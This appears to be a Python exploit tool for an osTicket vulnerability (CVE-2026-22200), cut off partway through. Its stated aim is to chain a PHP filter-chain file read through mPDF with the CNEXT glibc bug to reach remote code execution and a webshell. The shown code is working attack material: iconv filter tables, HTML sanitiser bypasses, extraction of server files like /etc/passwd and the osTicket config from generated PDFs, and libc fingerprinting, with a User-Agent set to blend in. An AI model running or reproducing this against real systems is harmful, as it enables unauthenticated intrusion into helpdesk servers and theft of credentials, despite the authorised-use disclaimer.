#!/usr/bin/env python3
"""
CVE-2026-22200 — osTicket PDF Arbitrary File Read + CNEXT RCE Automation
========================================================================

Chains a PHP filter injection in osTicket's mPDF integration with
CVE-2024-2961 (CNEXT glibc iconv overflow) to achieve unauthenticated
Remote Code Execution on vulnerable osTicket installations (≤ 1.18.2).

Attack Flow
-----------
1.  Detect osTicket installation & check vulnerability indicators.
2.  Register a new user account (or use supplied credentials).
3.  Log in, create a support ticket.
4.  Inject PHP-filter-chain payloads to exfiltrate server files
    (/etc/passwd, include/ost-config.php, /proc/self/maps, partial libc).
5.  Extract bitmap-embedded data from the exported PDF.
6.  Fingerprint the target's glibc, download the full libc from libc.rip.
7.  Generate a CNEXT heap-exploit payload that writes a PHP webshell.
8.  Inject the CNEXT payload via a ticket reply and trigger it.
9.  Provide an interactive pseudo-shell through the webshell.

References
----------
- Horizon3.ai blog : https://horizon3.ai/attack-research/attack-blogs/
                      ticket-to-shell-exploiting-php-filters-and-cnext-in-osticket-cve-2026-22200/
- PoC repository   : https://github.com/horizon3ai/CVE-2026-22200
- CNEXT original   : https://github.com/ambionics/cnext-exploits

Requirements
------------
    pip install requests PyMuPDF Pillow pwntools

Disclaimer
----------
This tool is provided **strictly for authorised security assessments**.
Unauthorised access to computer systems is illegal.  The authors accept
no liability for misuse.  Use responsibly.
"""

from __future__ import annotations

import argparse
import base64
import io
import os
import random
import re
import string
import struct
import sys
import tempfile
import time
import traceback
import zlib
from dataclasses import dataclass
from typing import Optional
from urllib.parse import quote, urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

requests.packages.urllib3.disable_warnings()

# ---------------------------------------------------------------------------
# Optional heavy dependencies — degrade gracefully when missing
# ---------------------------------------------------------------------------
try:
    import fitz  # PyMuPDF
    from PIL import Image as PILImage

    HAS_PDF_LIBS = True
except ImportError:
    HAS_PDF_LIBS = False

try:
    from pwn import ELF, p64

    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False


# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════

REQUEST_TIMEOUT: int = 30
HEAP_SIZE: int = 2 * 1024 * 1024
CNEXT_BUG_CHAR: bytes = "劄".encode("utf-8")
NT_GNU_BUILD_ID: int = 3

# User-Agent that blends in with normal browser traffic
DEFAULT_UA: str = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)

# PHP filter iconv character-generation lookup table.
# Each hex nibble of a base-64 character maps to an iconv chain that
# produces that byte when processed through convert.base64-decode/encode.
# Source: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
ICONV_MAPPINGS: dict[str, str] = {
    "30": (
        "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|"
        "convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE"
    ),
    "31": (
        "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|"
        "convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4"
    ),
    "32": (
        "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|"
        "convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921"
    ),
    "33": (
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE"
    ),
    "34": (
        "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|"
        "convert.iconv.CP950.UTF-16BE"
    ),
    "35": (
        "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|"
        "convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE"
    ),
    "36": (
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2"
    ),
    "37": (
        "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|"
        "convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4"
    ),
    "38": "convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16",
    "39": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "41": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "42": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "43": "convert.iconv.CN.ISO2022KR",
    "44": (
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.IBM932.SHIFT_JISX0213"
    ),
    "45": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "46": (
        "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|"
        "convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB"
    ),
    "47": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "48": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "49": (
        "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|"
        "convert.iconv.BIG5.SHIFT_JISX0213"
    ),
    "4a": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "4b": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "4c": (
        "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|"
        "convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC"
    ),
    "4d": (
        "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|"
        "convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T"
    ),
    "4e": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "4f": (
        "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|"
        "convert.iconv.ISO2022JP2.CP775"
    ),
    "50": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB"
    ),
    "51": (
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2"
    ),
    "52": (
        "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|"
        "convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4"
    ),
    "53": (
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.GBK.SJIS"
    ),
    "54": (
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103"
    ),
    "55": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "56": (
        "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|"
        "convert.iconv.BIG5.JOHAB"
    ),
    "57": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.MS932.MS936"
    ),
    "58": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "59": (
        "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|"
        "convert.iconv.UHC.CP1361"
    ),
    "5a": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.BIG5HKSCS.UTF16"
    ),
    "61": (
        "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|"
        "convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE"
    ),
    "62": (
        "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|"
        "convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE"
    ),
    "63": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "64": (
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.GBK.BIG5"
    ),
    "65": (
        "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|"
        "convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937"
    ),
    "66": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "67": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|"
        "convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8"
    ),
    "68": (
        "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|"
        "convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE"
    ),
    "69": (
        "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|"
        "convert.iconv.UTF16.GB13000"
    ),
    "6a": (
        "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|"
        "convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16"
    ),
    "6b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "6c": (
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE"
    ),
    "6d": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|"
        "convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949"
    ),
    "6e": (
        "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|"
        "convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61"
    ),
    "6f": (
        "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|"
        "convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE"
    ),
    "70": (
        "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|"
        "convert.iconv.BIG-FIVE.UCS-4"
    ),
    "71": (
        "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|"
        "convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2"
    ),
    "72": (
        "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|"
        "convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101"
    ),
    "73": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "74": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "75": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "76": (
        "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|"
        "convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932"
    ),
    "77": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "78": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "79": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "7a": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "2f": (
        "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|"
        "convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4"
    ),
}


# ═══════════════════════════════════════════════════════════════════════════════
#  TERMINAL STYLING
# ═══════════════════════════════════════════════════════════════════════════════

class Style:
    """ANSI escape codes for coloured terminal output."""

    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    RESET   = "\033[0m"

    @classmethod
    def disable(cls) -> None:
        """Strip all colour codes (for piped / non-TTY output)."""
        for attr in ("BOLD", "DIM", "RED", "GREEN", "YELLOW",
                      "BLUE", "MAGENTA", "CYAN", "RESET"):
            setattr(cls, attr, "")


def banner() -> None:
    """Print the tool banner."""
    print(f"""
{Style.RED}{Style.BOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║          CVE-2026-22200  ·  osTicket → Shell                ║
  ║      PHP Filter Chain + CNEXT (CVE-2024-2961) RCE           ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Horizon3.ai Attack Research  ·  Authorised Use Only        ║
  ╚══════════════════════════════════════════════════════════════╝
{Style.RESET}""")


def log_info(msg: str) -> None:
    print(f"  {Style.CYAN}[*]{Style.RESET} {msg}")

def log_good(msg: str) -> None:
    print(f"  {Style.GREEN}[+]{Style.RESET} {msg}")

def log_warn(msg: str) -> None:
    print(f"  {Style.YELLOW}[!]{Style.RESET} {msg}")

def log_fail(msg: str) -> None:
    print(f"  {Style.RED}[-]{Style.RESET} {msg}")

def log_debug(msg: str) -> None:
    print(f"  {Style.DIM}[D] {msg}{Style.RESET}")

def log_stage(num: int, title: str) -> None:
    width = 60
    print()
    print(f"  {Style.MAGENTA}{Style.BOLD}{'─' * width}{Style.RESET}")
    print(f"  {Style.MAGENTA}{Style.BOLD}  STAGE {num}: {title}{Style.RESET}")
    print(f"  {Style.MAGENTA}{Style.BOLD}{'─' * width}{Style.RESET}")
    print()


# ═══════════════════════════════════════════════════════════════════════════════
#  HTTP SESSION FACTORY
# ═══════════════════════════════════════════════════════════════════════════════

def build_session(
    proxy: Optional[str] = None,
    verify_ssl: bool = False,
) -> requests.Session:
    """Create a ``requests.Session`` with retry logic and optional proxy.

    Parameters
    ----------
    proxy : str, optional
        HTTP/SOCKS proxy URL (e.g. ``http://127.0.0.1:8080``).
    verify_ssl : bool
        Whether to verify TLS certificates.  Default ``False`` for
        pentesting convenience.

    Returns
    -------
    requests.Session
    """
    session = requests.Session()
    retries = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = verify_ssl
    session.headers.update({"User-Agent": DEFAULT_UA})

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    return session


# ═══════════════════════════════════════════════════════════════════════════════
#  GENERIC HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def extract_csrf_token(html: str) -> Optional[str]:
    """Extract ``__CSRFToken__`` from an osTicket HTML page.

    Returns
    -------
    str or None
        The token value, or ``None`` if not found.
    """
    patterns = [
        r'name=["\']__CSRFToken__["\'][^>]*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']__CSRFToken__["\']',
    ]
    for pat in patterns:
        match = re.search(pat, html, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def extract_topic_ids(html: str) -> list[int]:
    """Extract help-topic ``<option>`` IDs from the ``open.php`` form."""
    pattern = re.compile(
        r'<option[^>]*value=["\'](\d+)["\'][^>]*>',
        re.IGNORECASE,
    )
    return list({int(tid) for tid in pattern.findall(html) if tid.isdigit()})



def random_string(length: int = 8) -> str:
    """Generate a lowercase random alphanumeric string."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


# ═══════════════════════════════════════════════════════════════════════════════
#  PHP FILTER CHAIN PAYLOAD GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadGenerator:
    """Build PHP filter-chain payloads for osTicket's mPDF file-read.

    The core idea (from the HITCON 2022 *web2pdf* challenge by @_splitline_)
    is to prepend a valid BMP header to an arbitrary file so that mPDF
    renders it as an image inside the PDF.  The file contents can then be
    recovered by stripping the forged header.

    Two osTicket-specific bypasses are layered on top:

    1.  ``php%3a://`` URL-encoding to evade the older mPDF stream-wrapper
        blacklist (which URL-decodes *after* checking).
    2.  ``&#34`` / ``&#38;&#35;&#51;&#52;`` HTML-entity trick to survive
        htmLawed + osTicket's ``__html_cleanup`` callback.
    """

    BMP_WIDTH: int = 15000
    BMP_HEIGHT: int = 1

    @classmethod
    def _bmp_header(cls) -> bytes:
        """Minimal 54-byte BMP header for a 15000×1 24-bit bitmap."""
        return (
            b"BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00"
            b"(\x00\x00\x00"
            + cls.BMP_WIDTH.to_bytes(4, "little")
            + cls.BMP_HEIGHT.to_bytes(4, "little")
            + b"\x01\x00\x18\x00\x00\x00\x00\x00"
            b"\x04\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
        )

    @classmethod
    def build_file_read_filter(
        cls,
        file_path: str,
        encoding: str = "plain",
    ) -> str:
        """Return a ``php://filter/…`` URI that, when opened by mPDF,
        yields the target file wrapped in a BMP image.

        Parameters
        ----------
        file_path : str
            Absolute server path (e.g. ``/etc/passwd``).
        encoding : str
            One of ``"plain"``, ``"b64"``, ``"b64zlib"``.

        Returns
        -------
        str
            Full ``php://filter/…/resource=<path>`` URI.
        """
        bmp_b64 = base64.b64encode(cls._bmp_header()).decode()

        filters = (
            "convert.iconv.UTF8.CSISO2022KR|"
            "convert.base64-encode|"
            "convert.iconv.UTF8.UTF7|"
        )
        # Prepend each base-64 character of the BMP header (reversed)
        for char in reversed(bmp_b64):
            hex_char = f"{ord(char):02x}"
            if hex_char not in ICONV_MAPPINGS:
                raise ValueError(
                    f"No iconv mapping for character 0x{hex_char} ('{char}')"
                )
            filters += (
                f"{ICONV_MAPPINGS[hex_char]}|"
                "convert.base64-decode|"
                "convert.base64-encode|"
                "convert.iconv.UTF8.UTF7|"
            )
        filters += "convert.base64-decode"

        # Optional pre-encoding (applied *before* BMP wrapping)
        if encoding in ("b64", "b64zlib"):
            filters = "convert.base64-encode|" + filters
            if encoding == "b64zlib":
                filters = "zlib.deflate|" + filters

        return f"php://filter/{filters}/resource={file_path}"

    @staticmethod
    def _quote_uppercase(text: str) -> str:
        """URL-encode uppercase letters and special chars.

        osTicket's mPDF lowercases paths during processing; URL-encoding
        uppercase letters preserves them through the pipeline.
        """
        safe = string.ascii_lowercase + string.digits + "_.-~"
        parts: list[str] = []
        for ch in text:
            if "A" <= ch <= "Z":
                parts.append(f"%{ord(ch):02X}")
            elif ch in safe:
                parts.append(ch)
            else:
                parts.append(quote(ch))
        return "".join(parts)

    @classmethod
    def wrap_for_ticket(
        cls,
        php_uris: list[str],
        is_reply: bool = False,
    ) -> str:
        """Wrap one or more ``php://filter`` URIs in the osTicket
        HTML payload that bypasses htmLawed + ``__html_cleanup``.

        Parameters
        ----------
        php_uris : list[str]
            Payload URIs (from :meth:`build_file_read_filter` or CNEXT).
        is_reply : bool
            ``True`` when injecting via a ticket *reply* (which is
            entity-decoded twice), ``False`` for initial ticket creation.

        Returns
        -------
        str
            Ready-to-inject HTML string.
        """
        # The separator exploits a parsing differential in htmLawed.
        # &#34 (double-quote entity without trailing semicolon) survives
        # htmLawed, then gets decoded + stripped by __html_cleanup,
        # producing the bare ``url(…)`` that mPDF expects.
        #
        # For replies, osTicket decodes entities twice, so we need the
        # nested form: &#38;&#35;&#51;&#52; → &#34 → "
        sep = "&#38;&#35;&#51;&#52;" if is_reply else "&#34"

        items: list[str] = []
        for uri in php_uris:
            encoded_uri = cls._quote_uppercase(uri)
            items.append(
                f'<li style="list-style-image:url{sep}({encoded_uri})">'
                f"listitem</li>"
            )
        return "<ul>\n" + "\n".join(items) + "\n</ul>"


# ═══════════════════════════════════════════════════════════════════════════════
#  PDF IMAGE / DATA EXTRACTOR
# ═══════════════════════════════════════════════════════════════════════════════

class PDFExtractor:
    """Extract exfiltrated file data from bitmap images inside a PDF.

    The mPDF library embeds the PHP-filter output as a BMP image.  This
    class locates those images, strips the forged BMP header, and applies
    best-effort base64 / zlib decompression to recover the original file.
    """

    ISO2022_MARKER: bytes = b"\x1b$)C"

    @staticmethod
    def _decompress_zlib(data: bytes, chunk_size: int = 1024) -> bytes:
        """Best-effort raw-deflate decompression."""
        decompressor = zlib.decompressobj(wbits=-15)
        output = b""
        for i in range(0, len(data), chunk_size):
            try:
                output += decompressor.decompress(data[i : i + chunk_size])
            except zlib.error:
                return output + decompressor.flush()
        return output + decompressor.flush()

    @staticmethod
    def _decode_b64(data: bytes, min_bytes: int = 12) -> bytes:
        """Best-effort base64 decode with plaintext fallback."""
        data = data.strip()
        decoded = b""
        for i in range(0, len(data), 4):
            block = data[i : i + 4]
            try:
                decoded += base64.b64decode(block, validate=True)
            except Exception:
                if len(decoded) < min_bytes:
                    return data.decode("ascii", errors="ignore").encode()
                return decoded
        if len(decoded) < min_bytes:
            return data.decode("ascii", errors="ignore").encode()
        return decoded

    @classmethod
    def extract_from_pdf(
        cls,
        pdf_bytes: bytes,
        save_dir: Optional[str] = None,
    ) -> list[bytes]:
        """Return a list of recovered file contents from a PDF.

        Parameters
        ----------
        pdf_bytes : bytes
            Raw PDF file data.
        save_dir : str, optional
            If provided, save intermediate BMP files here for debugging.

        Returns
        -------
        list[bytes]
            One entry per extracted image.

        Raises
        ------
        RuntimeError
            If PyMuPDF / Pillow are not installed.
        """
        if not HAS_PDF_LIBS:
            raise RuntimeError(
                "PyMuPDF and Pillow are required for PDF extraction.  "
                "Install with: pip install PyMuPDF Pillow"
            )

        results: list[bytes] = []
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")

        total_pages = len(doc)
        total_images = 0
        images_with_marker = 0

        log_debug(f"PDF has {total_pages} page(s).")

        for page_idx in range(total_pages):
            page = doc[page_idx]
            image_list = page.get_images(full=True)
            log_debug(
                f"  Page {page_idx + 1}: {len(image_list)} image(s) found."
            )

            for img_idx, img_info in enumerate(image_list):
                total_images += 1
                xref = img_info[0]
                try:
                    pix = fitz.Pixmap(doc, xref)
                    if pix.alpha:
                        pix = fitz.Pixmap(fitz.csRGB, pix)

                    log_debug(
                        f"    Image {img_idx + 1}: "
                        f"{pix.width}×{pix.height} px, "
                        f"xref={xref}"
                    )

                    pil_img = PILImage.frombytes(
                        "RGB", [pix.width, pix.height], pix.samples
                    )
                    buf = io.BytesIO()
                    pil_img.save(buf, "BMP")
                    bmp_data = buf.getvalue()

                    # Optionally save raw BMP for manual inspection
                    if save_dir:
                        bmp_path = os.path.join(
                            save_dir,
                            f"page{page_idx + 1}_img{img_idx + 1}.bmp",
                        )
                        with open(bmp_path, "wb") as fh:
                            fh.write(bmp_data)
                        log_debug(f"    Saved BMP: {bmp_path}")

                    # Locate the ISO-2022 marker that separates the forged
                    # BMP header from the actual file content.
                    idx = bmp_data.find(cls.ISO2022_MARKER)
                    if idx == -1:
                        log_debug(
                            "    ISO-2022 marker NOT found — "
                            "this image is not an exfiltrated file."
                        )
                        continue

                    images_with_marker += 1
                    raw = bmp_data[idx + len(cls.ISO2022_MARKER) :]
                    raw = raw.replace(b"\x00", b"")

                    log_debug(
                        f"    ISO-2022 marker found at offset {idx}; "
                        f"raw payload: {len(raw):,} bytes."
                    )

                    decoded = cls._decode_b64(raw)
                    decompressed = cls._decompress_zlib(decoded)
                    final = decompressed if decompressed else decoded

                    log_debug(
                        f"    Decoded: {len(decoded):,} B → "
                        f"decompressed: {len(decompressed):,} B → "
                        f"final: {len(final):,} B."
                    )
                    results.append(final)

                except Exception as exc:
                    log_debug(f"    Error processing image: {exc}")
                    continue

        doc.close()

        # Summary diagnostics
        if total_images == 0:
            log_warn(
                "PDF contains 0 images.  The HTML payload was likely "
                "stripped before reaching mPDF.  Possible causes:"
            )
            log_warn(
                "  • The ticket form does NOT support rich-text/HTML "
                "(the message field is plain-text only)."
            )
            log_warn(
                "  • No help-topic with a rich-text 'message' field was "
                "selected; try specifying --topic-id manually."
            )
            log_warn(
                "  • HTML was sanitised more aggressively than expected "
                "(custom htmLawed config or WAF)."
            )
        elif images_with_marker == 0:
            log_warn(
                f"PDF has {total_images} image(s) but NONE contain the "
                f"ISO-2022 exfiltration marker.  The images are probably "
                f"logos/decorations, not exfiltrated files."
            )
            log_warn(
                "  The list-style-image CSS injection likely failed.  "
                "The HTML may have been sanitised or the form field "
                "does not render inline styles."
            )

        return results


# ═══════════════════════════════════════════════════════════════════════════════
#  LIBC FINGERPRINTING & DOWNLOAD
# ═══════════════════════════════════════════════════════════════════════════════

class LibcResolver:
    """Fingerprint a partial ``libc.so.6`` via its GNU Build ID and
    download the full binary from ``libc.rip``.

    Uses the libc.rip REST API directly (no pwntools dependency for
    this stage).

    API reference:
        POST https://libc.rip/api/find   {"buildid": "<hex>"}
        → [{id, buildid, download_url, symbols, …}]
    """

    LIBC_RIP_API: str = "https://libc.rip/api"

    # -- Build ID extraction -------------------------------------------

    @classmethod
    def extract_build_id(cls, data: bytes) -> Optional[str]:
        """Extract the GNU Build ID from (possibly partial) ELF data.

        Tries three strategies in order:

        1. Parse the ELF program headers to locate the PT_NOTE
           segment (most reliable when the ELF header is intact).
        2. Scan for the ``.note.gnu.build-id`` section by looking
           for the ``GNU\\x00`` magic with valid note header fields.
        3. Brute-force scan the first 64 KB for any 20-byte Build
           ID pattern following ``GNU\\x00``.

        Returns
        -------
        str or None
            Hex-encoded Build ID, e.g. ``"a5a3c3f65fd9…"``.
        """
        # Strategy 1: ELF header → program headers → PT_NOTE
        bid = cls._build_id_from_phdr(data)
        if bid:
            log_debug("Build ID found via ELF program headers.")
            return bid

        # Strategy 2: structured scan for NT_GNU_BUILD_ID notes
        bid = cls._build_id_from_note_scan(data)
        if bid:
            log_debug("Build ID found via note scan.")
            return bid

        # Strategy 3: relaxed scan (just look for GNU + 20 bytes)
        bid = cls._build_id_from_relaxed_scan(data)
        if bid:
            log_debug("Build ID found via relaxed scan.")
            return bid

        log_debug(
            "Build ID NOT found.  "
            f"Data starts with: {data[:16].hex()} "
            f"(expected: 7f454c46 for ELF)"
        )
        return None

    @staticmethod
    def _build_id_from_phdr(data: bytes) -> Optional[str]:
        """Parse ELF program headers to find PT_NOTE."""
        if len(data) < 64 or data[:4] != b"\x7fELF":
            return None

        ei_class = data[4]  # 1 = 32-bit, 2 = 64-bit
        pt_note = 4

        if ei_class == 2:
            fmt_ehdr = "<16sHHIQQQIHHHHHH"
            ehdr_size = struct.calcsize(fmt_ehdr)
            if len(data) < ehdr_size:
                return None
            fields = struct.unpack(fmt_ehdr, data[:ehdr_size])
            e_phoff = fields[5]
            e_phentsize = fields[9]
            e_phnum = fields[10]
            phdr_fmt = "<IIQQQQQQ"
        elif ei_class == 1:
            fmt_ehdr = "<16sHHIIIIIHHHHHH"
            ehdr_size = struct.calcsize(fmt_ehdr)
            if len(data) < ehdr_size:
                return None
            fields = struct.unpack(fmt_ehdr, data[:ehdr_size])
            e_phoff = fields[5]
            e_phentsize = fields[9]
            e_phnum = fields[10]
            phdr_fmt = "<IIIIIIII"
        else:
            return None

        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            end = off + struct.calcsize(phdr_fmt)
            if end > len(data):
                break
            phdr = struct.unpack(phdr_fmt, data[off:end])
            if phdr[0] != pt_note:
                continue

            if ei_class == 2:
                p_offset, p_filesz = phdr[2], phdr[5]
            else:
                p_offset, p_filesz = phdr[1], phdr[4]

            note_end = min(p_offset + p_filesz, len(data))
            bid = LibcResolver._parse_notes(
                data[p_offset:note_end]
            )
            if bid:
                return bid

        return None

    @staticmethod
    def _parse_notes(note_data: bytes) -> Optional[str]:
        """Parse ELF note entries for NT_GNU_BUILD_ID."""
        pos = 0
        while pos + 12 <= len(note_data):
            n_namesz, n_descsz, n_type = struct.unpack(
                "<III", note_data[pos : pos + 12]
            )
            pos += 12

            name_aligned = pos + ((n_namesz + 3) & ~3)
            desc_end = name_aligned + n_descsz

            if desc_end > len(note_data):
                break

            name = note_data[pos : pos + n_namesz]
            if (
                n_type == NT_GNU_BUILD_ID
                and name.rstrip(b"\x00") == b"GNU"
                and n_descsz > 0
            ):
                build_id = note_data[name_aligned:desc_end]
                return build_id.hex()

            pos = name_aligned + ((n_descsz + 3) & ~3)

        return None

    @staticmethod
    def _build_id_from_note_scan(
        data: bytes,
    ) -> Optional[str]:
        """Scan raw bytes for a structured NT_GNU_BUILD_ID note."""
        gnu_name = b"GNU\x00"
        offset = 0
        while True:
            idx = data.find(gnu_name, offset)
            if idx == -1:
                return None
            header_off = idx - 12
            if header_off < 0:
                offset = idx + 1
                continue
            try:
                n_namesz, n_descsz, n_type = struct.unpack(
                    "<III", data[header_off : header_off + 12]
                )
            except struct.error:
                offset = idx + 1
                continue

            if (
                n_namesz == 4
                and n_type == NT_GNU_BUILD_ID
                and 16 <= n_descsz <= 64
            ):
                build_id = data[idx + 4 : idx + 4 + n_descsz]
                if (
                    len(build_id) == n_descsz
                    and any(b != 0 for b in build_id)
                ):
                    return build_id.hex()
            offset = idx + 1

    @staticmethod
    def _build_id_from_relaxed_scan(
        data: bytes,
        scan_limit: int = 65536,
    ) -> Optional[str]:
        """Last-resort: find ``GNU\\x00`` + 20 bytes (SHA-1)."""
        gnu_name = b"GNU\x00"
        chunk = data[:scan_limit]
        offset = 0
        while True:
            idx = chunk.find(gnu_name, offset)
            if idx == -1:
                return None
            bid_start = idx + 4
            bid_end = bid_start + 20
            if bid_end <= len(chunk):
                candidate = chunk[bid_start:bid_end]
                if any(b != 0 for b in candidate):
                    return candidate.hex()
            offset = idx + 1

    # -- libc.rip API --------------------------------------------------

    @classmethod
    def search_by_build_id(
        cls, build_id: str
    ) -> list[dict]:
        """Query libc.rip for libraries matching a Build ID.

        Returns
        -------
        list[dict]
            Each dict has ``id``, ``buildid``, ``download_url``,
            ``symbols``, etc.
        """
        url = f"{cls.LIBC_RIP_API}/find"
        payload = {"buildid": build_id}
        try:
            resp = requests.post(
                url,
